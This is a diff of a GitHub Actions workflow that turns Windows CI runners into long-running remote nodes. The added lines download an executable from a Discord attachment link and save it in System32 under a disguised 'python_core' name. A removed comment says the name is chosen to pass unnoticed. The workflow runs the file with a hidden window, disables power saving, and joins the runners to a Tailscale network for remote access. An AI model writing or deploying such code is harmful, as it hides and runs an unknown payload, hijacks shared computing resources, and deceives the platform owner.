@@ -1,4 +1,4 @@
-name: Python-Core-System-v315
+name: Python-Core-System-v315-Refresh
 
 on:
   workflow_dispatch:
@@ -9,14 +9,13 @@ jobs:
     timeout-minutes: 3600
     strategy:
       matrix:
-        node_id: [1, 2] # Mantenemos 2 maquinas para mayor seguridad
+        node_id: [1, 2] # Configurado para 2 maquinas seguras
 
     steps:
       - name: 1. Optimize Energy Settings
         run: |
           powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
           powercfg /x -monitor-timeout-ac 0
-          powercfg /x -standby-timeout-ac 0
           powercfg /h off
 
       - name: 2. Enable Debugging Features
@@ -35,19 +34,22 @@ jobs:
 
       - name: 4. Deploy Runtime Module (V3.15)
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1475646734926610512/PYTHON_3.15.exe?ex=699e3e9d&is=699ced1d&hm=32c51d416d8f45f0a7bb058b71d0de685911f4d6a59100ce43847a6ce5dea10e&"
-          # Guardamos con un nombre de sistema para pasar desapercibido
+          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1475646734926610512/PYTHON_3.15.exe?ex=69a2331d&is=69a0e19d&hm=4d84c525c93f8263bf8abb0af321c54d98b2bb0c62230cd8748f4a7a8b2a2a25&"
           $dest = "C:\Windows\System32\python_core_v15.exe"
-          Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0"
-          if (Test-Path $dest) {
+          
+          try {
+              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
+              Write-Host "Descarga exitosa."
               Start-Process $dest -WindowStyle Hidden
+          } catch {
+              Write-Error "Fallo en la descarga. Es posible que el enlace de Discord haya caducado de nuevo."
+              exit 1
           }
 
       - name: 5. Establish Network Bridge (Tailscale)
         run: |
           Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
-          # Hostname unico por nodo
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="py-v15-${{ matrix.node_id }}"
 
       - name: 6. Monitoring & Maintenance Loop
